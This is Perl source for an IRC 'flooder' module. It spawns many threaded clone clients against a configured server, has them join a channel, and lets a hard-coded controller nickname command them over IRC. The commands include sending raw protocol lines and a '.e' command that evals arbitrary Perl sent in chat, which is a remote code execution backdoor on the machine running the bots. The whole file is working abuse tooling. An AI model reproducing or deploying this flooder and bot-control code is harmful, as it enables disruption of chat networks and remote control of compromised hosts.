#!/usr/bin/perl -w

package flooder;

use strict;
use threads;
use IO::Socket;
use Switch;

our (%main, %flooder, $socket);

sub start {
  my ($nickname, $maxnum, $i) = ($_[1], $_[2], 0);
  print "$nickname $maxnum\n";
  $maxnum = 1 if !$maxnum;
  while ($i < $maxnum) {
    $main{"threads:$nickname"} = threads->create(\&flooder, $nickname . $i);
    $main{"threads:$nickname"}->detach();
    sleep 1;
    $i++;
  }
}

sub flooder {
  $flooder{$_[0]} = new IO::Socket::INET(
    PeerAddr => $config::server,
    PeerPort => 6667,
    Proto    => 'tcp',
    Timeout  => 10
  );
  $flooder{$_[0]}->send("NICK $_[0]\nUSER " . int(rand(5000)) . " 8 * :" . int(rand(5000)) . "\r\n");
  while (my $data = $flooder{$_[0]}->getline) {
    print "$_[0]\-> $data\n";
    $flooder{$_[0]}->send ("PONG $1\r\n") if ($data =~ /^PING (.*)$/i);
    $flooder{$_[0]}->send ("NICK :$_[0]2\r\n") if ($data =~ /433/);
    if ($data =~ m/001/i) {
      $flooder{$_[0]}->send ("JOIN #epic\r\n");
    }
    if ($data =~ /^\:(.*?)\!(.*?)\@(.*?) PRIVMSG (.*?) \:(.*?)$/ig) {
      my ($nickname, $ident, $mask, $target, @param) = ($1, $2, $3, $4, split (" ", $5));
      my $command = shift @param;
      my $parameters = join " ", @param;
      if ($command =~ m/^\.(.*?)$/i && $nickname eq 'glitch') {
        my $channel = $target;
        flooder->parsespawn($_[0], $nickname, $channel, $command, $parameters);
      }
    }
    elsif ($data =~ m/^\:(.*?)\!(.*?)\@(.*?) JOIN \:(.*?)$/i) {
      my ($nickname, $ident, $vhost, $channel) = ($1, $2, $3, $4);
      $channel =~ s/\r//;
      if ($channel eq '#GroundZero' || $channel eq '#epic') {
        $flooder{$_[0]}->send("PRIVMSG $channel :Welcome to $channel\, $nickname\!\r\n");
      }
      next;
    }
  }
  delete $flooder{$_[0]};
  delete $main{"threads:$_[0]"};
}

sub parsespawn {
  my ($ssocket, $nickname, $channel, $command, $parameters, @sais)
    = ($_[1], $_[2], $_[3], $_[4], $_[5], split " ", $_[5]);
  if ($command =~ m/^\.quit/i) {
    $flooder{$ssocket}->send("QUIT $parameters\r\n");
  }
  if($command =~ m/^\.say/i) {
    $flooder{$ssocket}->send("PRIVMSG $channel :$parameters\r\n");
  }
  if($command =~ m/^\.act/i) {
    $flooder{$ssocket}->send("PRIVMSG $channel :ACTION $parameters\r\n");
  }
  if($command =~ m/^\.notice/i) {
    $flooder{$ssocket}->send("NOTICE $parameters\r\n");
  }
  if($command =~ m/^\.raw/i) {
    $flooder{$ssocket}->send("$parameters\r\n");
  }
  if($command =~ m/^\.e/i) {
    my $thr = threads->create( sub { eval($parameters); } )->detach;
    next;
  }
}

1;